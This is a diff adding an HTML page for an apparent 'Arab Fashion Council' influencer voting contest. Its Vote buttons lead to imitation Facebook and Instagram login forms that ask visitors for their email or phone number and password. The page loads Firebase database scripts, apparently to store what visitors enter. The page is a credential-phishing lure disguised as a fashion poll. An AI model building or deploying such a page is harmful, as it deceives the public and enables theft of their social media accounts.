@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Empowering Arab Fashion: Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design.">
+  <link rel="icon" href="image/favicon.png" type="image/x-icon">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/profile.css">
+  <script src="js/index.js"></script>
+  <title>Arab Fashion Council</title>
+</head>
+<body>
+  <div id="home">
+    <header>
+      <img src="img/slide.png">
+      <p align="center">
+        <button id="vote2" onclick="vote()">
+          Click Here To Vote
+        </button><br>
+        <!-- <button id="vote2" onclick="vote()">
+                                  Join contest
+                                                            </button>-->
+      </p>
+
+    </header>
+
+    <div id="blue">
+
+      <h2>
+        Arab Fashion Council
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+        Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council is your gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where tradition meets modernity, and where fashion becomes a powerful expression of identity.
+      </p>
+    </div>
+
+    <div id="news">
+      <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
+
+    </div>
+
+    <div id="blue">
+
+      <h2>
+        📢 How to Vote:
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+      </p>
+    </div>
+
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite influencer!</p>
+
+    </div>
+
+ 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Meet Our Contestants</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+ <profile>
+
+        <!-- Profile Card 1 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant001.jpg" alt="Profile 1" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionCouncil</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 2 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant002.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#DubaiFashionWeek</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 3 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant003.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionInnovation</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 4 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant004.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Creativity</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 5 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant005.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionHeritage</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 6 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant006.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#CulturalCouture</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 7 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant007.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionTrends</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 8 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant008.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionista</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+    </profile>
+  </center>
+  </div>
+<center>
+      <div id="choose">
+        <center>
+          <p>
+            Vote using:
+          </p>
+        </center>
+        <center>
+          <p>
+            <img id="fb" onclick="fb()" src="image/fb.png">
+            <img id="ig" onclick="ig()" src="image/ig.png">
+          </p>
+          <br>
+          <button onclick="can()" id="cancel">Close</button>
+        </center>
+      </div>
+    </center>
+    <center>
+      <div id="fbp">
+        <div class="facebook-login" id="fb2" align="center">
+
+          <div class="ggt">
+
+            <img src="image/fb.png" alt="logo" id="fblogo">
+            <h1 id="fb2">
+              facebook
+            </h1>
+            <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+            <input type="password" placeholder="Password" id="fb-pass"><br>
+            <button onclick="login()" id="fb-log">
+              Log in
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </center>
+    <center>
+      <div id="igp">
+        <div class="Instagram-login" id="ig2" align="center">
+
+          <div class="ppt">
+
+            <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
+            <br>
+            <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+            <input type="password" placeholder="Password" id="ig-pass">
+            <br>
+            <button onclick="iglog()" id="ig-log">
+              log in
+            </button>
+          </div>
+        </div>
+      </div>
+    </center>
+  </div>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+
+
+    </script>
+  </body>
+  </html>
